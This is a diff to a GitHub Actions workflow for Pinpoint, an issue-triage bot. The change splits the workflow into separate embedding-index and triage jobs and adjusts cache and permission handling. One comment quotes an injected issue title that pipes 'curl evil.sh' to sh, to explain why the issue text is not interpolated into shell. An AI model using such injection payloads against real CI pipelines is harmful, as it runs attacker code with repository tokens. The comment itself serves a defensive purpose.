@@ -2,48 +2,75 @@
 # As is, it needs NO secrets: functions are embedded on the runner (bge-small) and ranked by similarity
 # to the issue. Posting uses the job's own GITHUB_TOKEN. For the better agent ranking and a "Why"
 # paragraph, pick an LLM in the Triage step below (any OpenAI-compatible API, or Databricks).
+#
+# Two jobs, because GitHub gives untrusted triggers (anyone can open an issue) a read-only Actions cache:
+#   index   on a push to the default branch, or by hand (Actions tab -> Pinpoint -> Run workflow):
+#           embeds new/changed functions and SAVES the cache. Run it once after installing.
+#   triage  on a new issue: RESTORES the cache (only code changed since the last index is embedded),
+#           ranks, comments.
 name: Pinpoint
 
 on:
   issues:
     types: [opened]
+  push:
+  workflow_dispatch:
 
 # Least privilege: read the code, write issue comments. Nothing else.
 permissions:
   contents: read
   issues: write
 
-# One triage at a time: a burst of new issues can't burn an LLM quota in parallel.
+# One run at a time: a burst of new issues can't burn an LLM quota in parallel.
 concurrency:
   group: pinpoint
   cancel-in-progress: false
 
-jobs:
-  triage:
-    if: github.event.issue.user.type != 'Bot'
-    runs-on: ubuntu-latest
-    timeout-minutes: 60          # a cold repo embeds every function once; later runs reuse the cache
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0         # full history: the default (1 commit) would make one commit "own" every line
+env:
+  PINPOINT_SOURCE: git+https://github.com/Vishaal-G/PinPoint.git
+  PINPOINT_EMBEDDER: local
+  FASTEMBED_CACHE_PATH: ~/.cache/pinpoint/fastembed   # the model rides along in the cache too
 
-      - uses: actions/setup-python@v5
+jobs:
+  index:
+    # Pushes to the default branch only: other branches would index code no issue is triaged against.
+    if: github.event_name == 'workflow_dispatch' || (github.event_name == 'push' && github.ref == format('refs/heads/{0}', github.event.repository.default_branch))
+    runs-on: ubuntu-latest
+    timeout-minutes: 60          # the first index embeds every function once
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-python@v7
         with:
           python-version: "3.12"
-
-      # Cache entries are immutable, so save under a fresh key every run and restore the newest
-      # one by prefix: each run starts from the last run's embeddings and only embeds changed functions.
-      - uses: actions/cache@v4
+      # Cache entries are immutable: restore the newest by prefix, save under a fresh key.
+      - uses: actions/cache@v6
         with:
           path: ~/.cache/pinpoint
           key: pinpoint-embeddings-${{ github.run_id }}
           restore-keys: pinpoint-embeddings-
+      - run: pip install "pinpoint[bot,local-embed] @ ${PINPOINT_SOURCE}"
+      - run: pinpoint-bot --index-only
 
+  triage:
+    if: github.event_name == 'issues' && github.event.issue.user.type != 'Bot'
+    runs-on: ubuntu-latest
+    timeout-minutes: 60          # with no index yet, a large repo embeds every function here
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          fetch-depth: 0         # full history: the default (1 commit) would make one commit "own" every line
+      - uses: actions/setup-python@v7
+        with:
+          python-version: "3.12"
+      - uses: actions/cache/restore@v6     # restore only: issue runs can't save (see the top of this file)
+        with:
+          path: ~/.cache/pinpoint
+          key: pinpoint-embeddings-
+          restore-keys: pinpoint-embeddings-
       - name: Install Pinpoint
         run: pip install "pinpoint[bot,local-embed] @ ${PINPOINT_SOURCE}"
-        env:
-          PINPOINT_SOURCE: git+https://github.com/Vishaal-G/PinPoint.git
 
       # The issue text is NOT interpolated here (no ${{ github.event.issue.* }} in `run:`): a title like
       # `"; curl evil.sh | sh; "` would run as shell. pinpoint-bot reads it from $GITHUB_EVENT_PATH as data.
@@ -51,8 +78,6 @@ jobs:
         run: pinpoint-bot
         env:
           GITHUB_TOKEN: ${{ github.token }}
-          PINPOINT_EMBEDDER: local
-          FASTEMBED_CACHE_PATH: ~/.cache/pinpoint/fastembed   # the model rides along in the cache above
           PINPOINT_LLM: none            # embeddings only: no secrets, weaker ranking, no explanation
           # Any OpenAI-compatible chat API with tool calling (a hosted provider, a gateway, your own
           # server): replace the line above with these, and add the key as a repo secret.
@@ -60,6 +85,7 @@ jobs:
           # PINPOINT_LLM_URL: https://api.example.com/v1
           # PINPOINT_LLM_MODEL: the-model-name
           # PINPOINT_LLM_KEY: ${{ secrets.PINPOINT_LLM_KEY }}
-          # Databricks (what Pinpoint was tuned and scored on: Llama 3.3 70B): drop PINPOINT_LLM and add
+          # Databricks (what Pinpoint was tuned and scored on: Llama 3.3 70B): drop PINPOINT_LLM, drop
+          # PINPOINT_EMBEDDER from the top-level env (both jobs then embed with bge-large), and add to both jobs
           # DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}     # https://dbc-....cloud.databricks.com
           # DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}   # a personal access token
